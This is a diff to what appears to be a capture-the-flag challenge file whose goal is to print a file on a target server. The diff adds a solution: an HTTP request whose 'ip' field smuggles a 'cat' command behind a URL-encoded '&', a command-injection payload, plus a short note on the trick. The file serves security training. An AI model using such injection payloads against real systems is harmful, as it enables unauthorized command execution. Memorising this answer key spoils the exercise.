@@ -18,6 +18,16 @@ text: |-
 
   **Goal: Print (`cat`) the file `/app/dragon-detector-ai`**.
 
+solution: |-
+  POST /detect-dragon.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 40
+
+  ip=1.2.3.4%26cat /app/dragon-detector-ai
+
+solution_note: I used '&' (URLEncoded)
+
 hints: []
 
 target: detector
